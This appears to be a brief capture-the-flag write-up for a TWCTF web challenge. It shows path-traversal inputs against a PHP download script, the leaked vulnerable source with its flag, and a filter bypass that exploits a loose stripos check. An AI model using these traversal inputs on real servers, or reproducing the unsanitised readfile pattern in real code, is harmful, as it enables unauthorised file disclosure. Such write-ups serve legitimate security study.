Vulnerability : download.php?f=951470281beb8a490a941ac73bd10953

** 1- Download "download.php" ** <br>
download.php?f=../download.php
```php
// TWCTF{then_can_y0u_read_file_list?}
$filename = $_GET['f'];
if(stripos($filename, 'file_list') != false) die();
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename='$filename'");
readfile("uploads/$filename");
```
** 2- Read "file_list.php" **<br>

download.php?f=file_list../../file_list.php


